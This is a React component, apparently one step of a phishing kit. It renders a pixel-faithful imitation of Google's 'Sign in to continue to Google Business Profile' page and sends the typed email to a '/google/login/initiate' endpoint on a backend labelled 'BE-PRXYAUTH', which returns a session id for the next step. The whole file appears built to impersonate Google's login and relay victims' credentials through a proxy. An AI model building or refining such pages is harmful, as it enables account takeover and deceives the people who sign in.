"use client";

import React, { useState } from "react";
import { useRegistration } from "./RegistrationContext";
import { Button } from "../ui/Button";
import api from "../../lib/api";
import { AxiosError } from "axios";

export default function Step3Email() {
  const {
    data,
    updateData,
    setStep,
    isLoading,
    setIsLoading,
    error,
    setError,
  } = useRegistration();
  const [email, setEmail] = useState(data.email);

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!email) return;

    setIsLoading(true);
    setError(null);
    updateData({ email });

    try {
      // Step 3: Initiate login with email
      // Calling BE-PRXYAUTH endpoint: POST /api/google/login/initiate
      const response = await api.post("/google/login/initiate", {
        email: email,
      });

      if (response.data.success) {
        updateData({ sessionId: response.data.sessionId });
        setStep(4);
      } else {
        setError(response.data.message || "Failed to initiate login");
      }
    } catch (err: any) {
      if (err instanceof AxiosError && err.response) {
        setError(
          err.response.data.message ||
            err.response.data.error ||
            "An error occurred",
        );
      } else {
        setError("Network error. Please try again.");
      }
    } finally {
      setIsLoading(false);
    }
  };

  return (
    <form onSubmit={handleSubmit} className="w-full max-w-[450px] mx-auto">
      <div className="text-center mb-8">
        <h1 className="text-[24px] font-normal text-[#1f1f1f] mb-2">Sign in</h1>
        <p className="text-[16px] text-[#1f1f1f]">
          to continue to Google Business Profile
        </p>
      </div>

      <div className="space-y-6">
        <div className="relative">
          <input
            type="email"
            id="email"
            value={email}
            onChange={(e) => setEmail(e.target.value)}
            className="block px-3.5 pb-2.5 pt-4 w-full text-[16px] text-[#1f1f1f] bg-transparent rounded-[4px] border border-[#747775] focus:border-[#0b57d0] focus:ring-1 focus:ring-[#0b57d0] appearance-none focus:outline-none peer h-[56px]"
            placeholder=" "
            required
          />
          <label
            htmlFor="email"
            className="absolute text-[16px] text-[#444746] duration-300 transform -translate-y-4 scale-75 top-2 z-10 origin-[0] bg-white px-1 peer-focus:px-1 peer-focus:text-[#0b57d0] peer-placeholder-shown:scale-100 peer-placeholder-shown:-translate-y-1/2 peer-placeholder-shown:top-1/2 peer-focus:top-2 peer-focus:scale-75 peer-focus:-translate-y-4 left-2.5"
          >
            Email or phone
          </label>
        </div>

        {error && (
          <div className="text-[#b3261e] text-sm flex items-start mt-2">
            <svg
              aria-hidden="true"
              className="w-4 h-4 mr-2 mt-0.5"
              fill="currentColor"
              focusable="false"
              viewBox="0 0 24 24"
              xmlns="http://www.w3.org/2000/svg"
            >
              <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"></path>
            </svg>
            {error}
          </div>
        )}

        <div className="pt-2">
          <a
            href="#"
            className="text-[#0b57d0] font-medium text-[14px] hover:bg-[#f5f8fd] px-1 py-0.5 rounded"
          >
            Forgot email?
          </a>
        </div>

        <div className="text-[14px] text-[#444746] mt-8">
          Not your computer? Use Guest mode to sign in privately.{" "}
          <a
            href="#"
            className="text-[#0b57d0] font-medium hover:bg-[#f5f8fd] px-1 py-0.5 rounded"
          >
            Learn more
          </a>
        </div>
      </div>

      <div className="flex justify-between items-center mt-12">
        <Button
          type="button"
          variant="text"
          onClick={() => {}}
          className="text-[#0b57d0]"
        >
          Create account
        </Button>
        <Button
          type="submit"
          isLoading={isLoading}
          disabled={!email || isLoading}
        >
          Next
        </Button>
      </div>
    </form>
  );
}
